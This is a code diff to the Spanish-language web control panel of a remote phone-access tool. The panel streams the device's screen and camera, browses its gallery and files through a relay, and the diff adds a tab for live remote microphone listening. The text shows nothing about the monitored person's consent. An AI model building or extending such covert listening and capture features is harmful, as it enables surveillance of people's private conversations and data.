@@ -78,6 +78,7 @@ body{background:#0A0714;color:#fff;font-family:-apple-system,sans-serif;height:1
     <div class="tab" onclick="showTab('camera')">📷 Cámara</div>
     <div class="tab" onclick="showTab('gallery')">🖼️ Galería</div>
     <div class="tab" onclick="showTab('files')">📁 Archivos</div>
+    <div class="tab" onclick="showTab('mic')">🎙️ Micro</div>
     <div class="tab" onclick="showTab('info')">📱 Info</div>
   </div>
   <div class="content">
@@ -146,6 +147,20 @@ body{background:#0A0714;color:#fff;font-family:-apple-system,sans-serif;height:1
       <input type="file" id="fileInput" style="display:none" multiple onchange="uploadFiles(this.files)">
       <div id="fileList" class="files"><div class="empty"><span style="font-size:36px">📁</span>Selecciona una carpeta</div></div>
     </div>
+    <!-- Micrófono -->
+    <div class="panel" id="panelMic">
+      <div class="stream" id="micArea" style="flex-direction:column;gap:16px">
+        <div style="font-size:48px">🎙️</div>
+        <div style="color:#8B949E;font-size:13px">Pulsa Iniciar para escuchar el micrófono</div>
+        <canvas id="micCanvas" width="600" height="80" style="background:#000;border-radius:8px;max-width:100%"></canvas>
+        <div id="micStatus" style="font-size:12px;color:#8B949E">Inactivo</div>
+      </div>
+      <div class="ctrl">
+        <button class="btn g" onclick="startMic()">🎙️ Iniciar</button>
+        <button class="btn r" onclick="stopMic()">⏹ Detener</button>
+      </div>
+    </div>
+
     <!-- Info -->
     <div class="panel" id="panelInfo">
       <div class="ctrl"><button class="btn p" onclick="cmd('info')">🔄 Actualizar</button></div>
@@ -199,6 +214,13 @@ function handleBinary(buf){
   const view=new Uint8Array(buf);
   const prefix=String.fromCharCode(view[0],view[1]);
   const frameData=buf.slice(2);
+
+  if(prefix==='M:'){
+    // Audio WAV del micrófono
+    playAudioChunk(frameData.slice(0)); // clonar buffer
+    return;
+  }
+
   const blob=new Blob([frameData],{type:'image/jpeg'});
   const url=URL.createObjectURL(blob);
   let areaId=prefix==='S:'?'screenArea':prefix==='C:'?'cameraArea':null;
@@ -228,7 +250,7 @@ function stopStream(type){
   document.getElementById(areaId).innerHTML=`<div class="nosig">${type==='screen'?'🖥️':'📷'}<br>Stream detenido</div>`;
   cmd(type==='screen'?'screen_stop':'cam_stop');
 }
-function stopAllStreams(){clearInterval(screenInt);clearInterval(camInt);screenInt=null;camInt=null;}
+function stopAllStreams(){clearInterval(screenInt);clearInterval(camInt);screenInt=null;camInt=null;if(micActive)stopMic();}
 
 // ── Archivos ──────────────────────────────────────────────────────────────────
 function setView(v){
@@ -406,13 +428,14 @@ function renderDevBar(){
 }
 
 function showTab(name){
-  document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',['screen','camera','gallery','files','info'][i]===name));
+  document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',['screen','camera','gallery','files','mic','info'][i]===name));
   document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
   document.getElementById('panel'+name[0].toUpperCase()+name.slice(1))?.classList.add('active');
   stopAllStreams();
   if(name==='info')    cmd('info');
   if(name==='files')   listFiles(currentPath||'/sdcard');
   if(name==='gallery') loadGallery(galleryType, 0);
+  if(name==='mic')     {} // no auto-start
 }
 function setRS(on){const e=document.getElementById('relayStatus');e.textContent=on?'● Conectado':'● Desconectado';e.className='rs '+(on?'on':'off');}
 function icon(n){if(/\.(mp4|mov|avi|mkv)$/i.test(n))return'🎬';if(/\.(mp3|aac|wav)$/i.test(n))return'🎵';if(/\.pdf$/i.test(n))return'📄';if(/\.apk$/i.test(n))return'📦';if(/\.zip|\.rar$/i.test(n))return'🗜️';return'📄';}
@@ -502,6 +525,56 @@ function downloadMedia(mediaId, filename){
   const reqId='dl_'+Date.now();
   dlCallbacks[reqId]={filename};
   cmd('gallery_download',{media_id:mediaId, filename, reqId});
+}
+
+// ── Micrófono ─────────────────────────────────────────────────────────────
+let audioCtx = null;
+let micActive = false;
+
+function startMic() {
+  micActive = true;
+  if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  cmd('mic_start');
+  document.getElementById('micStatus').textContent = '🔴 Escuchando...';
+  document.getElementById('micStatus').style.color = '#EF4444';
+}
+
+function stopMic() {
+  micActive = false;
+  cmd('mic_stop');
+  document.getElementById('micStatus').textContent = 'Inactivo';
+  document.getElementById('micStatus').style.color = '#8B949E';
+}
+
+function playAudioChunk(arrayBuffer) {
+  if (!micActive || !audioCtx) return;
+  try {
+    audioCtx.decodeAudioData(arrayBuffer, (decoded) => {
+      const src = audioCtx.createBufferSource();
+      src.buffer = decoded;
+      src.connect(audioCtx.destination);
+      src.start();
+      drawWaveform(decoded);
+    });
+  } catch(e) {}
+}
+
+function drawWaveform(buffer) {
+  const canvas = document.getElementById('micCanvas');
+  if (!canvas) return;
+  const ctx = canvas.getContext('2d');
+  const data = buffer.getChannelData(0);
+  const w = canvas.width, h = canvas.height;
+  ctx.fillStyle = '#000'; ctx.fillRect(0,0,w,h);
+  ctx.strokeStyle = '#7C3AED'; ctx.lineWidth = 1.5;
+  ctx.beginPath();
+  const step = Math.ceil(data.length / w);
+  for (let i = 0; i < w; i++) {
+    const v = data[i * step] || 0;
+    const y = (v * 0.5 + 0.5) * h;
+    i === 0 ? ctx.moveTo(i, y) : ctx.lineTo(i, y);
+  }
+  ctx.stroke();
 }
 
 connect();
